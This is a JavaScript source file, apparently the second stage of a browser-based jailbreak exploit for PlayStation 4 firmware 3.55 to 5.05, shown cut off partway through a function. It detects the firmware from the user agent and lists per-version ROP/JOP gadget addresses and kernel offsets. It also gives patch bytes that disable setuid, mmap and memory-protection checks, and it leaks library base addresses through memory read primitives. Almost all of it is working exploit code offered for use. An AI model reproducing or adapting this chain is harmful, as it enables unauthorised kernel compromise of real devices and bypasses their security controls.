var p;
var socket_ip_pc = '192.168.2.79';
var socket_port_send = 9023;
var dump_kernel = 0;
var dump_kernel_with_patches = 1;
var devkit = true;

function sleep(milliseconds) {
	var start = new Date().getTime();
	for (var i = 0; i < 1e7; i++) {
		if ((new Date().getTime() - start) > milliseconds)
			break;
	}
}

var print = function (x) {
	document.getElementById("console").innerText += x + "\n";
}
var print = function (string) { // like print but html
	document.getElementById("console").innerHTML += string + "\n";
}

var get_jmptgt = function (addr) {
	var z = p.read4(addr) & 0xFFFF;
	var y = p.read4(addr.add32(2));
	if (z != 0x25ff)
		return 0;
	return addr.add32(y + 6);
}

window.stage2 = function () {
	try {
		stage2_();
	} catch (e) {
		alert(e);
	}
}

var gadgetmap_wk = {
	"ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
	"pop rsi": [0x5e, 0xc3],
	"pop rdi": [0x5f, 0xc3],
	"pop rsp": [0x5c, 0xc3],
	"pop rax": [0x58, 0xc3],
	"pop rdx": [0x5a, 0xc3],
	"pop rcx": [0x59, 0xc3],
	"pop rbp": [0x5d, 0xc3],
	"pop r8": [0x47, 0x58, 0xc3],
	"pop r9": [0x47, 0x59, 0xc3],
	"infloop": [0xeb, 0xfe, 0xc3],
	"ret": [0xc3],
	"mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
	"mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
	"mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
};

var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
slowpath_jop.reverse();

var gadgets;

/* Get user agent for determining system firmware */
var fwFromUA = navigator.userAgent.substring(navigator.userAgent.indexOf("5.0 (") + 19, navigator.userAgent.indexOf(") Apple"));
if (fwFromUA == "5.03") alert(fwFromUA + " is not supported yet");

if (fwFromUA == "3.55") {
	gadgetcache = {
		// Regular ROP Gadgets
		"ret":                    0x00000062, // 3.55
		"jmp rax":                0x00000092, // 3.55
		"ep":                     0x000000BD, // 3.55
		"pop rbp":                0x000000C6, // 3.55
		"mov [rdi], rax":         0x0011FC37, // 3.55
		"pop r8":                 0x004C13BD, // 3.55
		"pop rax":                0x0001C6AB, // 3.55
		"mov rax, rdi":           0x000057C3, // 3.55
		"mov rax, [rax]":         0x0004ADD2, // 3.55
		"pop rsi":                0x000B9EBB, // 3.55
		"pop rdi":                0x00113991, // 3.55
		"pop rcx":                0x003CA71B, // 3.55
		"pop rsp":                0x00376850, // 3.55
		"mov [rdi], rsi":         0x004584D0, // 3.55
		"pop rdx":                0x00001AFA, // 3.55
		"pop r9":                 0x00EE0A8F, // 3.55
		"jop":                    0x0086D4F4, // 3.55 SPECIAL
		"infloop":                0x00057F2F, // 3.55
		
		// kROP gadgets
		"mov [rdx], rax":         0x005DC43D, // 3.55
		"add rax, rcx":           0x000879D7, // 3.55
		"mov rdx, rax":           0x0000B45C, // 3.55
		"mov rax, rdx":           0x002E19F1, // 3.55
		"jmp rdx":                0x0002A4B2, // 3.55
		
		// namedobj kexploit
		"push rax; jmp rcx":      0x004854B0, // 3.55
		
		// BPF race kexploit
		"leave":                  0x0000AE00, // 3.55
		
		// BPF race old kexploit
		"leave_1":                0x00003E8A, // 3.55

		// BPF double free kexploit
		"ret2userland":           0x0000FC7A, // 3.55
		"add rsp, 0x28":          0x00006AF2, // 3.55
		"mov rax, [rdi]":         0x000A0450, // 3.55
		"mov [rsi], rdx":         0x011EC433, // 3.55
		"add rdi, rax; mov rax, rdi":0x012B48D8, // 3.55
		
		// BPF double free JOP kdumper
		"mov rsi, rax; jmp rcx":  0x001AC260, // 3.55
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x0061A86D, // 3.55 SPECIAL
		"jop2":                   0x00886461, // 3.55
		"jop3":                   0x01120BAB, // 3.55
		"jop4":                   0x0086D4F0, // 3.55 SPECIAL
		"jop_mov rbp, rsp":       0x00D472C1, // 3.55 SPECIAL
		"jop6":                   0x005CB98D, // 3.55 SPECIAL
		
		// Functions
		"longjmp":                0x00000D98, // 3.55
		"createThread":           0x002D1CB0, // 3.55
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000018, // 3.55-4.05
		"stackshift_jop6":        0x00000028, // 3.55-5.05
		"jump_shift_jop1":        0x000003C0, // 3.55-4.05
		"jump_shift_jop5":        0x00000410, // 3.55-4.05
		"jump_shift_jop6":        0x00000358, // 3.55-4.05
	};
} else if (fwFromUA == "4.05") {
	gadgetcache = {
		// Regular ROP Gadgets
		"ret":                    0x000000C8, // 4.05
		"jmp rax":                0x00000093, // 4.05
		"ep":                     0x000000BE, // 4.05
		"pop rbp":                0x000000C7, // 4.05
		"mov [rdi], rax":         0x0011ADD7, // 4.05
		"pop r8":                 0x004A3B0D, // 4.05
		"pop rax":                0x0001D70B, // 4.05
		"mov rax, rdi":           0x00005863, // 4.05
		"mov rax, [rax]":         0x000FD88D, // 4.05
		"pop rsi":                0x000A459E, // 4.05
		"pop rdi":                0x0010F1C1, // 4.05
		"pop rcx":                0x001FCA9B, // 4.05
		"pop rsp":                0x0020AEB0, // 4.05
		"mov [rdi], rsi":         0x0043CF70, // 4.05
		"pop rdx":                0x000D6660, // 4.05
		"pop r9":                 0x00EB5F8F, // 4.05
		"jop":                    0x00852624, // 4.05 SPECIAL
		"infloop":                0x00B29049, // 4.05
		
		// kROP gadgets
		"mov [rdx], rax":         0x005BB74D, // 4.05
		"add rax, rcx":           0x00086F06, // 4.05
		"mov rdx, rax":           0x0000B44A, // 4.05
		"mov rax, rdx":           0x000DAB96, // 4.05
		"jmp rdx":                0x0027A198, // 4.05
		
		// namedobj kexploit
		"push rax; jmp rcx":      0x00469B80, // 4.05
		
		// BPF race kexploit
		"leave":                  0x001B7D63, // 4.05

		// BPF race old kexploit
		"leave_1":                0x00003F1A, // 4.05
		
		// BPF double free kexploit
		"ret2userland":           0x0000FC0A, // 4.05
		"add rsp, 0x28":          0x00006B72, // 4.05
		"mov rax, [rdi]":         0x0009E490, // 4.05
		"mov [rsi], rdx":         0x011C1703, // 4.05
		"add rdi, rax; mov rax, rdi":0x01289BA8, // 4.05
		
		// BPF double free JOP kdumper
		"mov rsi, rax; jmp rcx":  0x001A7B90, // 4.05
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x005FA63D, // 4.05 SPECIAL
		"jop2":                   0x0086BAC1, // 4.05
		"jop3":                   0x010F5E7B, // 4.05
		"jop4":                   0x00852620, // 4.05 SPECIAL
		"jop_mov rbp, rsp":       0x002F88E4, // 4.05 SPECIAL
		"jop6":                   0x005AAD1D, // 4.05 SPECIAL
		
		// Functions
		"longjmp":                0x00000DE0, // 4.05
		"createThread":           0x002C48C0, // 4.05
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000018, // 4.05
		"stackshift_jop6":        0x00000028, // 4.05-5.05
		"jump_shift_jop1":        0x000003C0, // 4.05
		"jump_shift_jop5":        0x00000410, // 4.05
		"jump_shift_jop6":        0x00000358, // 4.05
	};
} else if (fwFromUA == "4.55" || fwFromUA == "4.74") {
	gadgetcache = {
		// Regular ROP Gadgets
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x00003FBA, // 4.55-4.74
		"pop r8":                 0x0000CC42, // 4.55-4.74
		"pop rax":                0x0000CC43, // 4.55-4.74
		"mov rax, rdi":           0x0000E84E, // 4.55-4.74
		"mov rax, [rax]":         0x000130A3, // 4.55-4.74
		"pop rsi":                0x0007B1EE, // 4.55-4.74
		"pop rdi":                0x0007B23D, // 4.55-4.74
		"pop rcx":                0x00271DE3, // 4.55-4.74
		"pop rsp":                0x0027A450, // 4.55-4.74
		"mov [rdi], rsi":         0x0039CF70, // 4.55-4.74
		"pop rdx":                0x00565838, // 4.55-4.74
		"pop r9":                 0x0078BA1F, // 4.55-4.74
		"jop":                    0x01277350, // 4.55-4.74
		"infloop":                0x012C4009, // 4.55-4.74

		// kROP gadgets
		"mov [rdx], rax":         0x009B5BE3, // 4.55-4.74
		"add rax, rcx":           0x0084D04D, // 4.55-4.74
		"mov rdx, rax":           0x00012A16, // 4.55-4.74
		"mov rax, rdx":           0x001E4EDE, // 4.55-4.74
		"jmp rdx":                0x001517C7, // 4.55-4.74

		// BPF race kexploit
		"leave":                  0x0003EBD0, // 4.55-4.74
		
		// BPF double free kexploit
		"ret2userland":           0x0008905C, // 4.55-4.74
		"add rsp, 0x28":          0x000028A2, // 4.55-4.74
		"mov rax, [rdi]":         0x0013A220, // 4.55-4.74
		"mov [rsi], rdx":         0x01574006, // 4.55-4.74
		"add rdi, rax; mov rax, rdi":0x0141D1CD, // 4.55-4.74
		
		// BPF double free JOP kdumper
		"mov rsi, rax; jmp rcx":  0x00018C10, // 4.55-4.74
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x005D365D, // 4.55-4.74
		"jop2":                   0x007B0E65, // 4.55-4.74
		"jop3":                   0x0142BDBB, // 4.55-4.74
		"jop4":                   0x00637AC4, // 4.55-4.74
		"jop_mov rbp, rsp":       0x001B5B7A, // 4.55-4.74
		"jop6":                   0x000F391D, // 4.55-4.74
		
		// Functions
		"longjmp":                0x00001458, // 4.55-4.74
		"createThread":           0x0116ED40, // 4.55-4.74
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000048, // 4.55-4.74
		"stackshift_jop6":        0x00000028, // 4.05-5.05
		"jump_shift_jop1":        0x000007D0, // 4.55-5.05
		"jump_shift_jop5":        0x00000420, // 4.55-5.05
		"jump_shift_jop6":        0x00000040, // 4.55-5.05
	};
} else if (fwFromUA == "5.01") {
	gadgetcache = {
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x0014536B, // 5.01
		"pop r8":                 0x000179C5, // 5.01-5.05
		"pop rax":                0x000043F5, // 5.01-5.05
		"mov rax, rdi":           0x000058D0, // 5.01-5.05
		"mov rax, [rax]":         0x0006C83A, // 5.01-5.05
		"pop rsi":                0x0008F38A, // 5.01-5.05
		"pop rdi":                0x00038DBA, // 5.01-5.05
		"pop rcx":                0x00052E59, // 5.01-5.05
		"pop rsp":                0x0001E687, // 5.01-5.05
		"mov [rdi], rsi":         0x00023AC2, // 5.01-5.05
		"pop rdx":                0x000DEDC2, // 5.01
		"pop r9":                 0x00BB30CF, // 5.01
		"jop":                    0x000C37D0, // 5.01-5.05
		"infloop":                0x0151EFCA, // 5.01

		// kROP gadgets
		"mov [rdx], rax":         0x001F149B, // ?5.01?-5.05
		"add rax, rcx":           0x000156DB, // 5.01-5.05
		"mov rdx, rax":           0x00353A71, // 5.01
		"mov rax, rdx":           0x001CEE60, // 5.01
		"jmp rdx":                0x0000E3D0, // 5.05
		
		// BPF double free kexploit
		"ret2userland":           0x0005CDB9, // 5.01-5.05
		"add rsp, 0x28":          0x00004C2E, // ?5.01?-5.05
		"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
		"mov [rsi], rdx":         0x00A6450A, // ?5.01?-5.05
		"add rdi, rax; mov rax, rdi":0x0055566F, // 5.01
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x012A184D, // 5.01
		"jop2":                   0x006EF2E5, // 5.01
		"jop3":                   0x015CA29B, // 5.01
		"jop4":                   0x012846B4, // 5.01
		"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
		"jop6":                   0x002728A1, // 5.01
		
		"longjmp":                0x000014E8, // 5.01-5.05
		"createThread":           0x00779190, // 5.01
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000058, // 5.01-5.05
		"stackshift_jop6":        0x00000028, // 4.05-5.05
		"jump_shift_jop1":        0x000007D0, // 4.55-5.05
		"jump_shift_jop5":        0x00000420, // 4.55-5.05
		"jump_shift_jop6":        0x00000040, // 4.55-5.05
	};
} else if (fwFromUA == "5.05") {
	gadgetcache = {
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x003ADAEB, // 5.05
		"pop r8":                 0x000179C5, // 5.01-5.05
		"pop rax":                0x000043F5, // 5.01-5.05
		"mov rax, rdi":           0x000058D0, // 5.01-5.05
		"mov rax, [rax]":         0x0006C83A, // 5.01-5.05
		"pop rsi":                0x0008F38A, // 5.01-5.05
		"pop rdi":                0x00038DBA, // 5.01-5.05
		"pop rcx":                0x00052E59, // 5.01-5.05
		"pop rsp":                0x0001E687, // 5.01-5.05
		"mov [rdi], rsi":         0x00023AC2, // 5.01-5.05
		"pop rdx":                0x001BE024, // 5.05
		"pop r9":                 0x00BB320F, // 5.05
		"jop":                    0x000C37D0, // 5.01-5.05
		"infloop":                0x01545EAA, // 5.05

		// kROP gadgets
		"mov [rdx], rax":         0x001F149B, // 5.05
		"add rax, rcx":           0x000156DB, // 5.01-5.05
		"mov rdx, rax":           0x00353B31, // 5.05
		"mov rax, rdx":           0x001CEF20, // 5.05
		"jmp rdx":                0x0000E3D0, // 5.05
		
		// BPF double free kexploit
		"ret2userland":           0x0005CDB9, // 5.01-5.05
		"add rsp, 0x28":          0x00004C2E, // ?5.01?-5.05
		"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
		"mov [rsi], rdx":         0x00A6450A, // 5.05
		"add rdi, rax; mov rax, rdi":0x005557DF, // 5.05
		
		// BPF double free JOP kdumper
		"mov rsi, rax; jmp rcx":  0x0000DEE0, // 5.05
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x012A19CD, // 5.05
		"jop2":                   0x006EF4E5, // 5.05
		"jop3":                   0x015CA41B, // 5.05
		"jop4":                   0x01284834, // 5.05
		"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
		"jop6":                   0x00272961, // 5.05
		
		"longjmp":                0x000014E8, // 5.01-5.05
		"createThread":           0x00779390, // 5.05
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000058, // 5.01-5.05
		"stackshift_jop6":        0x00000028, // 4.05-5.05
		"jump_shift_jop1":        0x000007D0, // 4.55-5.05
		"jump_shift_jop5":        0x00000420, // 4.55-5.05
		"jump_shift_jop6":        0x00000040, // 4.55-5.05
	};
}
window.gadgets_shift = gadgetshiftcache;

if (fwFromUA == "3.55") {
	kernel_offsets = {
		"_vn_lock_break_slide":       0x00242CE6, // 3.55
		"__stack_chk_guard":          0x0242AD10, // 3.55
		"kqueue_close_slide":         0x0017BC22, // 3.55
		"bpf_slide":                  0x0024BDA3, // 3.55
		"jmp [rsi]":                  0x001EF468, // 3.55
		"cpu_setregs":                0x003A6E80, // 3.55
		"mov cr0, rax":               0x003A6E89, // 3.55
		"sys_setuid_patch_offset":    0x001A45C0, // 3.55
		"sys_mmap_patch_offset":      0x00349A97, // 3.55
		"vm_map_protect_patch_offset":0x003417B3, // 3.55
		"amd64_syscall_patch1_offset":0x000ED096, // 4.05
		"amd64_syscall_patch2_offset":0x003BBBEA, // 3.55
		"sys_dynlib_dlsym_patch1_offset":0x0014AADD, // 4.05
		"sys_dynlib_dlsym_patch2_offset":0x000E2DA0, // 4.05
		"syscall_11_patch1_offset":   0x00EEDA90, // 3.55
		"syscall_11_patch2_offset":   0x00EEDA98, // 3.55
		"syscall_11_patch3_offset":   0x00EEDAB8, // 3.55
	};
	kernel_patches = {
		// E8 8B EE 15 00 89 C3 85 -> B8 00 00 00 00 89 C3 85
		"sys_setuid_patch_1":         0x000000B8, // 3.55-5.05
		"sys_setuid_patch_2":         0x85C38900, // 3.55-4.05
		"sys_mmap_patch_1":           0x37B54137, // 3.55
		"sys_mmap_patch_2":           0x3145C031, // 3.55-5.05
		"vm_map_protect_patch_1":     0x9090CA39, // 3.55
		"vm_map_protect_patch_2":     0x90909090, // 3.55-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0xF8858B48, // 4.05
		"amd64_syscall_patch2_1":     0x00000FE9, // 3.55
		"amd64_syscall_patch2_2":     0x528B4800, // 3.55
		"sys_dynlib_dlsym_patch1_1":  0x000000E9, // 4.05
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
} else if (fwFromUA == "4.05") {
	kernel_offsets = {
		"_vn_lock_break_slide":       0x00109E96, // 4.05
		"__stack_chk_guard":          0x024600D0, // 4.05
		"kqueue_close_slide":         0x00233A60, // 4.05
		"bpf_slide":                  0x00317809, // 4.05
		"jmp [rsi]":                  0x0075373F, // 4.05
		"cpu_setregs":                0x00389330, // 4.05
		"mov cr0, rax":               0x00389339, // 4.05
		"sys_setuid_patch_offset":    0x00085BB0, // 4.05
		"sys_mmap_patch_offset":      0x0031CFDC, // 4.05
		"vm_map_protect_patch_offset":0x004423E7, // 4.05
		"amd64_syscall_patch1_offset":0x000ED096, // 4.05
		"amd64_syscall_patch2_offset":0x000ED0BB, // 4.05
		"sys_dynlib_dlsym_patch1_offset":0x0014AADD, // 4.05
		"sys_dynlib_dlsym_patch2_offset":0x000E2DA0, // 4.05
		"syscall_11_patch1_offset":   0x00F179A0, // 4.05
		"syscall_11_patch2_offset":   0x00F179A8, // 4.05
		"syscall_11_patch3_offset":   0x00F179C8, // 4.05
	};
	kernel_patches = {
		// E8 8B EE 15 00 89 C3 85 -> B8 00 00 00 00 89 C3 85
		"sys_setuid_patch_1":         0x000000B8, // 4.05-5.05
		"sys_setuid_patch_2":         0x85C38900, // 3.55-4.05
		"sys_mmap_patch_1":           0x37B74137, // 4.05
		"sys_mmap_patch_2":           0x3145C031, // 4.05-5.05
		"vm_map_protect_patch_1":     0x9090C239, // 4.05
		"vm_map_protect_patch_2":     0x90909090, // 4.05-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0xF8858B48, // 4.05
		"amd64_syscall_patch2_1":     0x00007DE9, // 4.05
		"amd64_syscall_patch2_2":     0x72909000, // 4.05
		"sys_dynlib_dlsym_patch1_1":  0x000000E9, // 4.05
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
} else if (fwFromUA == "4.55") {
	kernel_offsets = {
		"__stack_chk_guard":          0x02610AD0, // 4.55
		"jmp [rsi]":                  0x0013A39F, // 4.55
		"kqueue_close_slide":         0x001E2640, // 4.55
		"cpu_setregs":                0x00280F70, // 4.55
		"mov cr0, rax":               0x00280F79, // 4.55
		"sys_setuid_patch_offset":    0x001144E3, // 4.55
		"sys_mmap_patch_offset":      0x00141D14, // 4.55
		"vm_map_protect_patch_offset":0x00396A56, // 4.55
		"amd64_syscall_patch1_offset":0x003DC603, // 4.55
		"amd64_syscall_patch2_offset":0x003DC621, // 4.55
		"sys_dynlib_dlsym_patch1_offset":0x003CF6FE, // 4.55
		"sys_dynlib_dlsym_patch2_offset":0x000690C0, // 4.55
		"syscall_11_patch1_offset":   0x0102B8A0, // 4.55
		"syscall_11_patch2_offset":   0x0102B8A8, // 4.55
		"syscall_11_patch3_offset":   0x0102B8C8, // 4.55
	};
	kernel_patches = {
		// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
		"sys_setuid_patch_1":         0x000000B8, // 4.05-5.05
		"sys_setuid_patch_2":         0xC6894100, // 4.55-4.74
		"sys_mmap_patch_1":           0x37B64137, // 4.55-4.74
		"sys_mmap_patch_2":           0x3145C031, // 4.05-5.05
		"vm_map_protect_patch_1":     0x9090EA38, // 4.55-4.74
		"vm_map_protect_patch_2":     0x90909090, // 4.05-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0x40878B49, // 4.55-5.05
		"amd64_syscall_patch2_1":     0x909079EB, // 4.55-4.74
		"amd64_syscall_patch2_2":     0x72909090, // 4.55-5.05
		"sys_dynlib_dlsym_patch1_1":  0x000352E9, // 4.05-4.74
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
} else if (fwFromUA == "4.74") {
	kernel_offsets = {
		"jmp [rsi]":                  0x00139A2F, // 4.74
		"kqueue_close_slide":         0x001E48A0, // 4.74
		"cpu_setregs":                0x00283120, // 4.74
		"mov cr0, rax":               0x00283129, // 4.74
		"sys_setuid_patch_offset":    0x00113B73, // 4.74
		"sys_mmap_patch_offset":      0x001413A4, // 4.74
		"vm_map_protect_patch_offset":0x00397876, // 4.74
		"amd64_syscall_patch1_offset":0x003DD4B3, // 4.74
		"amd64_syscall_patch2_offset":0x003DD4D1, // 4.74
		"sys_dynlib_dlsym_patch1_offset":0x003D05AE, // 4.74
		"sys_dynlib_dlsym_patch2_offset":0x000686A0, // 4.74
		"syscall_11_patch1_offset":   0x010349A0, // 4.74
		"syscall_11_patch2_offset":   0x010349A8, // 4.74
		"syscall_11_patch3_offset":   0x010349C8, // 4.74
	};
	kernel_patches = {
		// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
		"sys_setuid_patch_1":         0x000000B8, // 4.05-5.05
		"sys_setuid_patch_2":         0xC6894100, // 4.55-4.74
		"sys_mmap_patch_1":           0x37B64137, // 4.55-4.74
		"sys_mmap_patch_2":           0x3145C031, // 4.05-5.05
		"vm_map_protect_patch_1":     0x9090EA38, // 4.55-4.74
		"vm_map_protect_patch_2":     0x90909090, // 4.05-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0x40878B49, // 4.55-5.05
		"amd64_syscall_patch2_1":     0x909079EB, // 4.55-4.74
		"amd64_syscall_patch2_2":     0x72909090, // 4.55-5.05
		"sys_dynlib_dlsym_patch1_1":  0x000352E9, // 4.05-4.74
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
} else if (fwFromUA == "5.01") {
	kernel_offsets = {
		"jmp [rsi]":                  0x00139A2F, // 4.74
		"kqueue_close_slide":         0x0016D762, // 5.01
	};
} else if (fwFromUA == "5.05") {
	if (devkit == true)
    {
	    kernel_offsets = {
		    "jmp [rsi]":                  0x00019FD0, // 5.05d
            "kqueue_close_slide":         0x001D76E2, // 5.05d
            "cpu_setregs":                0x002C5660, // 5.05d
            "mov cr0, rax":               0x002C5669, // 5.05d
            "sys_setuid_patch_offset":    0x00068B32, // 5.05d
            "sys_mmap_patch_offset":      0x00197BC0, // 5.05d
            "vm_map_protect_patch_offset":0x00217AA6, // 5.05d
            "amd64_syscall_patch1_offset":0x000004B5, // 5.05d
            "amd64_syscall_patch2_offset":0x000004D3, // 5.05d
            "sys_dynlib_dlsym_patch1_offset":0x002CA93A, // 5.05d
            "sys_dynlib_dlsym_patch2_offset":0x00360BD0, // 5.05d

            //"syscall_11_patch1_offset":   0x012AFD20, // 5.05d
            //"syscall_11_patch2_offset":   0x012AFD28, // 5.05d
            //"syscall_11_patch3_offset":   0x012AFD48, // 5.05d

            "syscall_11_patch1_offset":   0x012AFDB0, // 5.05d
            "syscall_11_patch2_offset":   0x012AFDB8, // 5.05d
            "syscall_11_patch3_offset":   0x012AFDD8, // 5.05d

            //"syscall_11_2_patch1_offset":   0x01AAFDB0, // 5.05d
            //"syscall_11_2_patch2_offset":   0x01AAFDB8, // 5.05d
            //"syscall_11_2_patch3_offset":   0x01AAFDD8, // 5.05d

            "syscall_11_2_patch1_offset":   0x01AAFE40, // 5.05d
            "syscall_11_2_patch2_offset":   0x01AAFE48, // 5.05d
            "syscall_11_2_patch3_offset":   0x01AAFE68, // 5.05d
	    };
    }
    else
    {
	    kernel_offsets = {
		    "jmp [rsi]":                  0x00093385, // 5.05
		    "kqueue_close_slide":         0x0016D872, // 5.05
		    "cpu_setregs":                0x00233020, // 5.05
		    "mov cr0, rax":               0x00233029, // 5.05
		    "sys_setuid_patch_offset":    0x00054A72, // 5.05
		    "sys_mmap_patch_offset":      0x0013D620, // 5.05
		    "vm_map_protect_patch_offset":0x001A3C06, // 5.05
		    "amd64_syscall_patch1_offset":0x00000493, // 5.05
		    "amd64_syscall_patch2_offset":0x000004B1, // 5.05
		    "sys_dynlib_dlsym_patch1_offset":0x00237F3A, // 5.05
		    "sys_dynlib_dlsym_patch2_offset":0x002B2620, // 5.05
		    "syscall_11_patch1_offset":   0x0107C820, // 5.05
		    "syscall_11_patch2_offset":   0x0107C828, // 5.05
		    "syscall_11_patch3_offset":   0x0107C848, // 5.05
	    };
    }

	kernel_patches = {
		// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C4
		"sys_setuid_patch_1":         0x000000B8, // 4.05-5.05
		"sys_setuid_patch_2":         0xC4894100, // 5.05
		"sys_mmap_patch_1":           0x37B64037, // 5.05
		"sys_mmap_patch_2":           0x3145C031, // 4.05-5.05
		"vm_map_protect_patch_1":     0x9090FA38, // 5.05
		"vm_map_protect_patch_2":     0x90909090, // 4.05-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0x40878B49, // 4.55-5.05
		"amd64_syscall_patch2_1":     0x90907DEB, // 5.05
		"amd64_syscall_patch2_2":     0x72909090, // 4.55-5.05
		"sys_dynlib_dlsym_patch1_1":  0x0001C1E9, // 5.05
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
}
window.kernel_offsets = kernel_offsets;
window.kernel_patches = kernel_patches;

function stage2_ () {
	p = window.prim;
	//alert("stage2");
	
	var slide = 0;
	if (window.ps4_fw <= 407)
		slide = 0x20;
	else
		slide = 0x40;
	p.leakfunc = function (func) {
		var fptr_store = p.leakval(func);
		return (p.read8(fptr_store.add32(0x18))).add32(slide);
	}

	var parseFloatStore = p.leakfunc(parseFloat);
	var parseFloatPtr = p.read8(parseFloatStore);
	// alert(parseFloatPtr);
	
	// Resolve libSceWebKit2 base using parseFloat offset
	var webKitBase = parseFloatPtr;
	if (fwFromUA == "3.55") {
		webKitBase.sub32inplace(0x55EA0);
	} else if (fwFromUA == "4.05") {
		webKitBase.sub32inplace(0x55FB0);
	} else if (fwFromUA == "4.55" || fwFromUA == "4.74") {
		webKitBase.sub32inplace(0xE8DDA0);
	} else if (fwFromUA == "5.00" || fwFromUA == "5.01") {
		webKitBase.sub32inplace(0x5783D0);
	} else if (fwFromUA == "5.03" || fwFromUA == "5.05" || fwFromUA == "5.07") {
		webKitBase.sub32inplace(0x578540);
	} else alert("unknown parseFloat offset\n parseFloatPtr: " + parseFloatPtr);
	window.webKitBase = webKitBase;
	//alert(window.webKitBase);
	var o2wk = function (o) {
		return webKitBase.add32(o);
	}
	window.o2wk = o2wk;
	
	if (fwFromUA == "3.55") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xE8),
			"__stack_chk_fail_offset": 0xD790,
			"memset": o2wk(0x138),
			"memset_offset": 0x92D10,
		};
	} else if (fwFromUA == "4.05") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xF0),
			"__stack_chk_fail_offset": 0xD0D0,
			"memset": o2wk(0x140),
			"memset_offset": 0x37080,
		};
	} else if (fwFromUA == "4.55") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
		};
	} else if (fwFromUA == "4.74") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
		};
	} else if (fwFromUA == "5.00" || fwFromUA == "5.01" || fwFromUA == "5.03" || fwFromUA == "5.05" || fwFromUA == "5.07") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0x11EC0,
			"memset": o2wk(0x228),
			"memset_offset": 0x225E0,
		};
	}
	
	var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets_temp.memset));
	libSceLibcInternalBase.sub32inplace(gadgets_temp.memset_offset);
	window.libSceLibcInternalBase = libSceLibcInternalBase;
	//alert(libSceLibcInternalBase);
	var o2lc = function (o) {
		return libSceLibcInternalBase.add32(o);
	}
	window.o2lc = o2lc;
	
	var libKernelBase = p.read8(get_jmptgt(gadgets_temp.__stack_chk_fail));
	libKernelBase.sub32inplace(gadgets_temp.__stack_chk_fail_offset);
	window.libKernelBase = libKernelBase;
	//alert(window.libKernelBase);
	var o2lk = function (o) {
		return libKernelBase.add32(o);
	}
	window.o2lk = o2lk;
	
	
	if (fwFromUA == "3.55") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xE8),
			"__stack_chk_fail_offset": 0xD790,
			"memcpy": o2wk(0x128),
